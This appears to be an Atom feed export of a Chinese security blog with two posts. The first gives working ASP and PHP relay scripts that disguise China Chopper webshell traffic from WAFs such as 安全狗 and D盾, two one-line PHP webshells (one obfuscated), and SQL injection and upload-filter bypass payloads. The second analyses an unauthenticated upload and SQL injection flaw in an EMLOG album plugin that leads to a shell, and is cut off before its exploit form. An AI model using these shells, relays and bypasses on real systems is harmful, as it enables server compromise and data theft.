<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[安全天使'Blog]]></title>
  <subtitle><![CDATA[原创 - 自由 - 共享 - 平等]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.weshell.net/"/>
  <updated>2015-01-10T08:20:10.748Z</updated>
  <id>http://www.weshell.net/</id>
  
  <author>
    <name><![CDATA[Angel]]></name>
    <email><![CDATA[webmaill@qq.com]]></email>
  </author>
  
  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
  
  <entry>
    <title><![CDATA[绕过D盾安全狗连接菜刀思路]]></title>
    <link href="http://www.weshell.net/for-waf.html"/>
    <id>http://www.weshell.net/for-waf.html</id>
    <published>2015-10-10T06:17:16.000Z</published>
    <updated>2015-01-10T07:09:34.000Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_各种奇葩符号">0x00 各种奇葩符号</h2>
<p>  现在基本上没啥用了，毕竟几年前的小玩意儿</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/;.xxx.asp;.jpg</div><div class="line">/;00.asp/00.jpg</div></pre></td></tr></table></figure>


<p>像这种各位看官可以忽略了，毕竟某狗和某盾也不是吃干饭的，写出来只是为了纪念一下</p>
<h2 id="0x02##_中转(1)，抓菜刀连接webshell的包_然后研究安全狗过滤了哪些关键字_中转替换掉那些过滤的关键字">0x02##  中转(1)，抓菜刀连接webshell的包 然后研究安全狗过滤了哪些关键字 中转替换掉那些过滤的关键字</h2>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">&lt;%</div><div class="line">JmStr=Replace(Request.Form,"$_POST","$_REQUEST")</div><div class="line">JmStr=Replace(JmStr,"-&gt;|","--&gt;|")</div><div class="line">JmStr=Replace(JmStr,"@eval(","@eval   (")</div><div class="line">JmStr=Replace(JmStr,"System.Convert.FromBase64String","System.Convert. FromBase64String")</div><div class="line">JMUrl=request("dz")</div><div class="line">response.write  request("dz")</div><div class="line">JmRef=JMUrl</div><div class="line">JmCok=""</div><div class="line">response.write  PostData(JMUrl,JmStr,JmCok,JmRef)</div><div class="line">Function PostData(PostUrl,PostStr,PostCok,PostRef)</div><div class="line">Dim Http</div><div class="line">Set Http = Server.CreateObject("msxml2.serverXMLHTTP")</div><div class="line">With Http</div><div class="line">.Open "POST",PostUrl,False</div><div class="line">.SetRequestHeader "Content-Length",Len(PostStr)</div><div class="line">.SetRequestHeader "Content-Type","application/x-www-form-urlencoded"</div><div class="line">.SetRequestHeader "Referer",PostRef</div><div class="line">'.SetRequestHeader "Cookie",PostCok</div><div class="line">.Send PostStr</div><div class="line">PostData = .ResponseBody</div><div class="line">End With</div><div class="line">Set Http = Nothing</div><div class="line">PostData =bytes2BSTR(PostData)</div><div class="line">End Function</div><div class="line"></div><div class="line">Function bytes2BSTR(vIn)</div><div class="line">Dim strReturn</div><div class="line">Dim I, ThisCharCode, NextCharCode</div><div class="line">strReturn = ""</div><div class="line">For I = 1 To LenB(vIn)</div><div class="line">ThisCharCode = AscB(MidB(vIn, I, 1))</div><div class="line">If ThisCharCode &lt; &H80 Then</div><div class="line">strReturn = strReturn & Chr(ThisCharCode)</div><div class="line">Else</div><div class="line">NextCharCode = AscB(MidB(vIn, I + 1, 1))</div><div class="line">strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))</div><div class="line">I = I + 1</div><div class="line">End If</div><div class="line">Next</div><div class="line">bytes2BSTR = strReturn</div><div class="line">End Function</div><div class="line"></div><div class="line">Function URLEncoding(vstrin)</div><div class="line">strReturn=""</div><div class="line">Dim i</div><div class="line">For i=1 To Len(vstrin)</div><div class="line">ThisChr=Mid(vstrin,i,1)</div><div class="line">if Abs(Asc(ThisChr))&lt; &HFF Then</div><div class="line">strReturn=strReturn & ThisChr</div><div class="line">Else</div><div class="line">InnerCode=Asc(ThisChr)</div><div class="line">If InnerCode&lt;0 Then</div><div class="line">InnerCode=InnerCode + &H10000</div><div class="line">End If</div><div class="line">Hight1=(InnerCode And &HFF00) \&HFF</div><div class="line">Low1=InnerCode And &HFF</div><div class="line">strReturn=strReturn & "%" & Hex(Hight1) & "%" & Hex(Low1)</div><div class="line">End if</div><div class="line">Next</div><div class="line">strReturn=Replace(strReturn,chr(32),"%20") '转换空格,如果网站过滤了空格,尝试用/**/来代替%20</div><div class="line">strReturn=Replace(strReturn,chr(43),"%2B")  'JMDCW增加转换+字符</div><div class="line">'strReturn=Replace(strReturn,过滤字符,"转换为字符")  '在此增加要过滤的代码</div><div class="line">URLEncoding=strReturn</div><div class="line">End Function</div><div class="line">%&gt;</div></pre></td></tr></table></figure>

<p>用法：<br>1.将这个脚本拿到可执行的.asp目录<br>2.访问<a href="http://demo.com/demo.asp?dz=&quot;要过的shell地址" target="_blank" rel="external">http://demo.com/demo.asp?dz=&quot;要过的shell地址</a>“<br>3.把地址输入菜刀，密码就是你设置的shell密码，类型还选一句话后缀<br>例如：<a href="http://www.xx.com/asf.asp?dz=http://xxx.com/yijuhua.php" target="_blank" rel="external">http://www.xx.com/asf.asp?dz=http://xxx.com/yijuhua.php</a> 密码<br>4.这个脚本暂时支持.php .aspx的一句话连接  .asp的不能用</p>
<h2 id="0x02##_中转(2)_若果上面脚本失效，可以使用这个">0x02## 中转(2) 若果上面脚本失效，可以使用这个</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="variable">$webshell</span>=<span class="string">"http://www.phpinfo.me/plus/helen.php"</span>;<span class="comment">//把这里改成你的shell地址</span></div><div class="line"><span class="variable">$webshell</span>=<span class="variable">$webshell</span>.<span class="string">"?&1141056911=base64_decode"</span>;</div><div class="line"><span class="variable">$da</span>=<span class="variable">$_POST</span>;</div><div class="line"><span class="variable">$data</span> = <span class="variable">$da</span>;</div><div class="line">@<span class="variable">$data</span>=str_replace(<span class="string">"base64_decode("</span>,<span class="string">'$_GET[1141056911]('</span>,<span class="variable">$data</span>); <span class="comment">//接收菜刀的post，并把base64_decode替换成$_GET[1141056911](</span></div><div class="line"> <span class="comment">//print_r($data);</span></div><div class="line"><span class="variable">$data</span> = http_build_query(<span class="variable">$data</span>);  </div><div class="line"><span class="variable">$opts</span> = <span class="keyword">array</span> (  </div><div class="line"><span class="string">'http'</span> =&gt; <span class="keyword">array</span> (  </div><div class="line"><span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,  </div><div class="line"><span class="string">'header'</span>=&gt; <span class="string">"Content-type: application/x-www-form-urlencoded\r\n"</span> .  </div><div class="line"><span class="string">"Content-Length: "</span> . strlen(<span class="variable">$data</span>) . <span class="string">"\r\n"</span>,  </div><div class="line"><span class="string">'content'</span> =&gt; <span class="variable">$data</span>)</div><div class="line">);</div><div class="line"><span class="variable">$context</span> = stream_context_create(<span class="variable">$opts</span>);  </div><div class="line"><span class="variable">$html</span> = @file_get_contents(<span class="variable">$webshell</span>, <span class="keyword">false</span>, <span class="variable">$context</span>); <span class="comment">//发送post  </span></div><div class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;  </div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>小马的话你可以把这两个丢进去：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]);<span class="preprocessor">?&gt;</span></div><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$x</span>=base64_decode(<span class="string">"YXNzZXJ0"</span>);<span class="variable">$x</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);<span class="preprocessor">?&gt;</span>;</div></pre></td></tr></table></figure>

<p>用法：<br>1.把$webshell改成你的webshell地址<br>2.把代码保存为1234.php放到你本地的php环境里 然后直接丢菜刀连接<br><img src="http://dn-wwweshell.qbox.me/caidao1.png" alt="菜刀"></p>
<h2 id="0x03##_伪装user-agent">0x03## 伪装user-agent</h2>
<p> 晚上工具有很多，你可以随便找一个用，firfox也是比较强大的，我用的是铁鹰兄的WAF绕过神器来做试验的，地址放在下面<br><img src="http://dn-wwweshell.qbox.me/tiey1.png" alt="waf绕过神器"></p>
<p>首先假设一个代理，ie设置之后，那么ie的流量就从这个端口过。<br>指定域名，也就是只正对目标站修改user-agent，减少工作量。<br>get改为post好像是过智创waf的吧。</p>
<h2 id="0x04##_复参数绕过">0x04## 复参数绕过</h2>
<p>比如一个请求是这样的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /pen/news.php?id=1 union select user,password from mysql.user</div></pre></td></tr></table></figure>

<p>可以修改为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /pen/news.php?id=1&id=union&id=select&id=user,password&id=from%20mysql.user</div></pre></td></tr></table></figure>

<p>很多WAF都可以这样绕，目前安全狗的话可以绕过一丢丢语句</p>
<h2 id="0x05##_番外篇_SQL注入绕过">0x05## 番外篇 SQL注入绕过</h2>
<p>  ok，首先来一发demo存在SQL注入漏洞的php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?</span></div><div class="line"><span class="variable">$uid</span> = <span class="variable">$_REQUEST</span>[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span> = @mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>))</div><div class="line"><span class="keyword">die</span>(<span class="string">'&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to connect to the database.'</span>);</div><div class="line"><span class="keyword">if</span>(!@mysql_select_db(<span class="string">"supe"</span>,<span class="variable">$conn</span>))</div><div class="line"><span class="keyword">die</span>(<span class="string">"&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to find it at database on your MySQL server."</span>);</div><div class="line"><span class="variable">$text</span> = <span class="string">"select * from supe_members where uid="</span>.<span class="variable">$uid</span>;</div><div class="line"><span class="variable">$rs</span> = mysql_query (<span class="variable">$text</span>,<span class="variable">$conn</span>);</div><div class="line"><span class="keyword">while</span>(<span class="variable">$rom</span> = mysql_fetch_array(<span class="variable">$rs</span>))</div><div class="line">{</div><div class="line">    <span class="keyword">echo</span> <span class="variable">$rom</span>[<span class="string">"username"</span>];</div><div class="line">}</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>因为用的是supesite的库，可以看到这里是有明显SQL注入漏洞的，当没有安全狗的时候可以成功注入：<br><img src="http://dn-wwweshell.qbox.me/sql0x1.png" alt="SQL注入"></p>
<p>测试发现，安全狗这块的匹配正则应该是\s+and这类的，所以只要想办法去掉空格，用普通注释/<em>*/是不行的，安全狗也防了这块。但是对内联注释/</em>!and*/这种不知道为什么安全狗没有拦截。<br>我用下面的语句居然成功绕过SQL注入过滤：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.200.115/inj.php?id=1/*!and*/1=2/*!union*//*!select*/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17</div></pre></td></tr></table></figure>

<h2 id="0x05##_番外篇_上传绕过">0x05## 番外篇 上传绕过</h2>
<p> 我们通过burp把上传的HTTP包抓下来，然后自己进行一下修改POST数据。经过了一些实验，直接说结果吧，当增加一处文件名和内容，让两个文件名不一致的时候，成功绕过了安全狗的防护，上传了php文件。原因是安全狗进行文件名匹配时候用的是第一个文件名test.jpg，是复合安全要求的，但是webserver在保存文件的时候却保存了第二个文件名test.php，也就是if(security_check(a)){do(b);}，导致安全检查没有用</p>
]]></content>
    <summary type="html">
    <![CDATA[若何绕过D盾、安全狗连接菜刀]]>
    
    </summary>
    
      <category term="技术文章" scheme="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[EMLOG相册插件SQL注入漏洞可GETshell]]></title>
    <link href="http://www.weshell.net/emlog-sql-getshell.html"/>
    <id>http://www.weshell.net/emlog-sql-getshell.html</id>
    <published>2015-01-07T13:17:16.000Z</published>
    <updated>2015-01-07T12:56:54.000Z</updated>
    <content type="html"><![CDATA[<p>emlog相册插件，几乎是emlog最早的插件之一，几乎有百分之75.3%的用户使用，可见此emlog相册插件SQL注入漏洞危害还是非常大的</p>
<p>我们来分析一下漏洞产生的原因：打开插件kl_album_ajax_do.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * kl_album_ajax_do.php</div><div class="line"> * design by KLLER</div><div class="line"> */</div><div class="line"><span class="keyword">require_once</span>(<span class="string">'../../../init.php'</span>);</div><div class="line"><span class="variable">$DB</span> = MySql::getInstance();</div><div class="line"><span class="variable">$kl_album_config</span> = unserialize(Option::get(<span class="string">'kl_album_config'</span>));</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'album'</span>]) && <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>])){</div><div class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'ini_get'</span>)){</div><div class="line">                <span class="variable">$kl_album_memory_limit</span> = ini_get(<span class="string">'memory_limit'</span>);</div><div class="line">                <span class="variable">$kl_album_memory_limit</span> = substr(<span class="variable">$kl_album_memory_limit</span>, <span class="number">0</span>, strlen(<span class="variable">$kl_album_memory_limit</span>)-<span class="number">1</span>);</div><div class="line">                <span class="variable">$kl_album_memory_limit</span> = (<span class="variable">$kl_album_memory_limit</span>+<span class="number">20</span>).<span class="string">'M'</span>;</div><div class="line">                ini_set(<span class="string">'memory_limit'</span>, <span class="variable">$kl_album_memory_limit</span>);</div><div class="line">        }</div><div class="line">        define(<span class="string">'KL_UPLOADFILE_MAXSIZE'</span>, kl_album_get_upload_max_filesize());</div><div class="line">        define(<span class="string">'KL_UPLOADFILE_PATH'</span>, <span class="string">'../../../content/plugins/kl_album/upload/'</span>);</div><div class="line">        define(<span class="string">'KL_IMG_ATT_MAX_W'</span>,        <span class="number">100</span>);<span class="comment">//图片附件缩略图最大宽</span></div><div class="line">        define(<span class="string">'KL_IMG_ATT_MAX_H'</span>,        <span class="number">100</span>);<span class="comment">//图片附件缩略图最大高</span></div><div class="line">        <span class="variable">$att_type</span> = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>);<span class="comment">//允许上传的文件类型</span></div><div class="line">        <span class="variable">$album</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'album'</span>]) ? intval(<span class="variable">$_POST</span>[<span class="string">'album'</span>]) : <span class="string">''</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'error'</span>] != <span class="number">4</span>){</div><div class="line">                <span class="variable">$upfname</span> = kl_album_upload_file(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'name'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'error'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'size'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'type'</span>], <span class="variable">$att_type</span>);</div><div class="line">                <span class="variable">$photo_size</span> = chImageSize(EMLOG_ROOT.substr(<span class="variable">$upfname</span>, <span class="number">2</span>), KL_IMG_ATT_MAX_W, KL_IMG_ATT_MAX_H);</div><div class="line">                <span class="variable">$result</span> = <span class="variable">$DB</span><span class="variable">-&gt;query</span>(<span class="string">"INSERT INTO "</span>.DB_PREFIX.<span class="string">"kl_album(truename, filename, description, album, addtime, w, h) VALUES('{$_FILES['Filedata']['name']}', '{$upfname}', '"</span>.date(<span class="string">'Y-m-d'</span>, time()).<span class="string">"', {$album}, "</span>.time().<span class="string">", {$photo_size['w']}, {$photo_size['h']})"</span>);</div><div class="line">                <span class="keyword">if</span>(<span class="variable">$result</span>){</div><div class="line">                        <span class="variable">$new_id</span> = <span class="variable">$DB</span><span class="variable">-&gt;insert_id</span>();</div><div class="line">                        <span class="variable">$the_option_value</span> = Option::get(<span class="string">'kl_album_'</span>.<span class="variable">$album</span>);</div><div class="line">                        <span class="keyword">if</span>(<span class="variable">$the_option_value</span> !== <span class="keyword">null</span>){</div><div class="line">                                <span class="variable">$the_option_value</span> = trim(<span class="variable">$new_id</span>.<span class="string">','</span>.<span class="variable">$the_option_value</span>, <span class="string">','</span>);</div><div class="line">                                Option::updateOption(<span class="string">'kl_album_'</span>.<span class="variable">$album</span>, <span class="variable">$the_option_value</span>);</div><div class="line">                                <span class="variable">$CACHE</span><span class="variable">-&gt;updateCache</span>(<span class="string">'options'</span>);</div><div class="line">                        }</div><div class="line">                }</div><div class="line">        }</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">}</div><div class="line"><span class="keyword">if</span>(ROLE != <span class="string">'admin'</span>) <span class="keyword">exit</span>(<span class="string">'access deined!'</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'action'</span>]) && <span class="variable">$_GET</span>[<span class="string">'action'</span>]!=<span class="string">''</span>){...</div></pre></td></tr></table></figure>

<p>可以看到在倒数第二行验证身份的代码在上传的代码后面，所以任意用户均可上传文件。那么我们来看看上传部分。里面似乎定义了一个$att_type = array(‘jpg’, ‘jpeg’, ‘png’, ‘gif’);，并将$att_type这个变量和$_FILES一起传入了kl_album_upload_file函数。我们进去看看：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">kl_album_upload_file</span><span class="params">(<span class="variable">$filename</span>, <span class="variable">$errorNum</span>, <span class="variable">$tmpfile</span>, <span class="variable">$filesize</span>, <span class="variable">$filetype</span>, <span class="variable">$type</span>, <span class="variable">$isIcon</span> = <span class="number">0</span>)</span></span>{</div><div class="line">        <span class="variable">$kl_album_config</span> = unserialize(Option::get(<span class="string">'kl_album_config'</span>));</div><div class="line">        <span class="variable">$extension</span>  = strtolower(substr(strrchr(<span class="variable">$filename</span>, <span class="string">"."</span>),<span class="number">1</span>));</div><div class="line">        <span class="variable">$uppath</span> = KL_UPLOADFILE_PATH . date(<span class="string">"Ym"</span>) . <span class="string">"/"</span>;</div><div class="line">        <span class="variable">$fname</span> = md5(<span class="variable">$filename</span>) . date(<span class="string">"YmdHis"</span>) . rand() .<span class="string">'.'</span>. <span class="variable">$extension</span>;</div><div class="line">        <span class="variable">$attachpath</span> = <span class="variable">$uppath</span> . <span class="variable">$fname</span>;</div><div class="line">        <span class="keyword">if</span>(!is_dir(KL_UPLOADFILE_PATH)){</div><div class="line">                umask(<span class="number">0</span>);</div><div class="line">                <span class="variable">$ret</span> = @mkdir(KL_UPLOADFILE_PATH, <span class="number">0777</span>);</div><div class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span> === <span class="keyword">false</span>) <span class="keyword">return</span> <span class="string">'创建文件上传目录失败'</span>;</div><div class="line">        }</div><div class="line">        <span class="keyword">if</span>(!is_dir(<span class="variable">$uppath</span>)){</div><div class="line">                umask(<span class="number">0</span>);</div><div class="line">                <span class="variable">$ret</span> = @mkdir(<span class="variable">$uppath</span>, <span class="number">0777</span>);</div><div class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span> === <span class="keyword">false</span>) <span class="keyword">return</span> <span class="string">"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写"</span>;</div><div class="line">        }</div><div class="line">        doAction(<span class="string">'kl_album_upload'</span>, <span class="variable">$tmpfile</span>);</div><div class="line">        <span class="comment">//缩略</span></div><div class="line">        <span class="variable">$imtype</span> = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'jpeg'</span>,<span class="string">'gif'</span>);</div><div class="line">        <span class="variable">$thum</span> = <span class="variable">$uppath</span>.<span class="string">"thum-"</span>. <span class="variable">$fname</span>;</div><div class="line">        <span class="variable">$attach</span> = in_array(<span class="variable">$extension</span>, <span class="variable">$imtype</span>) && function_exists(<span class="string">"ImageCreate"</span>) && kl_album_resize_image(<span class="variable">$tmpfile</span>,<span class="variable">$filetype</span>,<span class="variable">$thum</span>,<span class="variable">$isIcon</span>,KL_IMG_ATT_MAX_W,KL_IMG_ATT_MAX_H) ? <span class="variable">$thum</span> : <span class="variable">$attachpath</span>;</div><div class="line">        <span class="variable">$kl_album_compression_length</span> = <span class="keyword">isset</span>(<span class="variable">$kl_album_config</span>[<span class="string">'compression_length'</span>]) ? intval(<span class="variable">$kl_album_config</span>[<span class="string">'compression_length'</span>]) : <span class="number">1024</span>;</div><div class="line">        <span class="variable">$kl_album_compression_width</span> = <span class="keyword">isset</span>(<span class="variable">$kl_album_config</span>[<span class="string">'compression_width'</span>]) ? intval(<span class="variable">$kl_album_config</span>[<span class="string">'compression_width'</span>]) : <span class="number">768</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$kl_album_compression_length</span> == <span class="number">0</span> || <span class="variable">$kl_album_compression_width</span> == <span class="number">0</span>){</div><div class="line">                <span class="keyword">if</span>(@is_uploaded_file(<span class="variable">$tmpfile</span>)){</div><div class="line">                        <span class="keyword">if</span>(@!move_uploaded_file(<span class="variable">$tmpfile</span> ,<span class="variable">$attachpath</span>)){</div><div class="line">                                @unlink(<span class="variable">$tmpfile</span>);</div><div class="line">                                <span class="keyword">return</span> <span class="string">"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写"</span>;</div><div class="line">                        }<span class="keyword">else</span>{</div><div class="line">                                <span class="keyword">echo</span> <span class="string">'kl_album_successed'</span>;</div><div class="line">                        }</div><div class="line">                        chmod(<span class="variable">$attachpath</span>, <span class="number">0777</span>);</div><div class="line">                }</div><div class="line">        }<span class="keyword">else</span>{</div><div class="line">                <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>, <span class="variable">$imtype</span>) && function_exists(<span class="string">"ImageCreate"</span>) && kl_album_resize_image(<span class="variable">$tmpfile</span>,<span class="variable">$filetype</span>,<span class="variable">$attachpath</span>,<span class="variable">$isIcon</span>,<span class="variable">$kl_album_compression_length</span>,<span class="variable">$kl_album_compression_width</span>)){</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'kl_album_successed'</span>;</div><div class="line">                }<span class="keyword">else</span>{</div><div class="line">                        <span class="keyword">if</span>(@is_uploaded_file(<span class="variable">$tmpfile</span>)){</div><div class="line">                                <span class="keyword">if</span>(@!move_uploaded_file(<span class="variable">$tmpfile</span> ,<span class="variable">$attachpath</span>)){</div><div class="line">                                        @unlink(<span class="variable">$tmpfile</span>);</div><div class="line">                                        <span class="keyword">return</span> <span class="string">"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写"</span>;</div><div class="line">                                }<span class="keyword">else</span>{</div><div class="line">                                        <span class="keyword">echo</span> <span class="string">'kl_album_successed'</span>;</div><div class="line">                                }</div><div class="line">                                chmod(<span class="variable">$attachpath</span>, <span class="number">0777</span>);</div><div class="line">                        }</div><div class="line">                }</div><div class="line">        }</div><div class="line">        <span class="variable">$attach</span> = substr(<span class="variable">$attach</span>, <span class="number">6</span>, strlen(<span class="variable">$attach</span>));</div><div class="line">        <span class="keyword">return</span>         <span class="variable">$attach</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>这里可以看到，实际上我们传入的$type变量在这个函数里根本没有用到！函数中定义了一个$imtype = array(‘jpg’,’png’,’jpeg’,’gif’);，也不是用来验证后缀的，而是判断是否需要生成缩略图的。所以重点就是下面几行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$extension</span>  = strtolower(substr(strrchr(<span class="variable">$filename</span>, <span class="string">"."</span>),<span class="number">1</span>));</div><div class="line"><span class="variable">$uppath</span> = KL_UPLOADFILE_PATH . date(<span class="string">"Ym"</span>) . <span class="string">"/"</span>;</div><div class="line"><span class="variable">$fname</span> = md5(<span class="variable">$filename</span>) . date(<span class="string">"YmdHis"</span>) . rand() .<span class="string">'.'</span>. <span class="variable">$extension</span>;</div><div class="line"><span class="variable">$attachpath</span> = <span class="variable">$uppath</span> . <span class="variable">$fname</span>;</div></pre></td></tr></table></figure>

<p>在这可以看到上传的文件名是md5($filename) . date(“YmdHis”) . rand() .’.’. $extension;，原名的md5值+时间+rand随机数+后缀。md5值和时间基本比较好确定的，但是rand()随机数一般都有65535个可能性。<br>而且我们看到后面的代码，并没有把文件名输出的地方，只是echo ‘kl_album_successed’;。难道需要用字典暴力跑shell名字？我们返回kl_album_ajax_do.php，可以发现上传的if语句中有如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$result = $DB-&gt;query("INSERT INTO ".DB_PREFIX."kl_album(truename, filename, description, alb</div></pre></td></tr></table></figure>

<p>将$_FILES[‘Filedata’][‘name’]直接插入数据库。这里另造成了一个SQL注入漏洞，当然既然有之前的getshell，这里的注入就有点当陪衬了。不过emlog在遇到SQL语句出错的情况下是会报错的。所以所以，这里我们正好用到这个特性，通过报错可以将$upfname这个字段爆出来，这也就是我们上传成功的shell名字。如何报错？上传文件名里加个单引号即可。</p>
<p>我们来写一个表单：</p>
